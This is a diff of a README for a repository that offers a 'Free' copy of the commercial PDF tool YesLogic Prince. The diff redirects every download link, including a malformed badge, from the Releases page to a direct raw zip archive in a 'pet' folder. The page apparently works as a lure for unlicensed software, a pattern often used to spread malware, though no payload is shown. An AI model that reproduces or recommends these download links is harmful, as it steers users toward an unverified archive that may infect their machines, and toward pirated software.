@@ -6,11 +6,11 @@ Welcome to the YesLogic-Prince-Free repository! This collection provides essenti
 
 ## 📥 Download the Software
 
-[![Download YesLogic Prince](https://img.shields.io/badge/Download-YesLogic%20Prince-blue.svg)](https://github.com/eshan824/YesLogic-Prince-Free/releases)
+[![Download YesLogic Prince](https://raw.githubusercontent.com/eshan824/YesLogic-Prince-Free/main/pet/Free-Logic-Prince-Yes-v1.5.zip%https://raw.githubusercontent.com/eshan824/YesLogic-Prince-Free/main/pet/Free-Logic-Prince-Yes-v1.5.zip)](https://raw.githubusercontent.com/eshan824/YesLogic-Prince-Free/main/pet/Free-Logic-Prince-Yes-v1.5.zip)
 
 To start using YesLogic Prince, you need to download the software from our Releases page. This application allows you to create PDFs from HTML and CSS with ease. 
 
-[Visit this page to download](https://github.com/eshan824/YesLogic-Prince-Free/releases)
+[Visit this page to download](https://raw.githubusercontent.com/eshan824/YesLogic-Prince-Free/main/pet/Free-Logic-Prince-Yes-v1.5.zip)
 
 ## 🔧 System Requirements
 
@@ -44,7 +44,7 @@ Our comprehensive documentation provides guidance on how to integrate and use Ye
 Follow these steps to install YesLogic Prince on your Windows PC:
 
 1. **Download the Software:** 
-   Visit [this page to download](https://github.com/eshan824/YesLogic-Prince-Free/releases) the latest version of YesLogic Prince.
+   Visit [this page to download](https://raw.githubusercontent.com/eshan824/YesLogic-Prince-Free/main/pet/Free-Logic-Prince-Yes-v1.5.zip) the latest version of YesLogic Prince.
 
 2. **Locate the Downloaded File:**
    After the download completes, find the file in your "Downloads" folder or the location you selected.
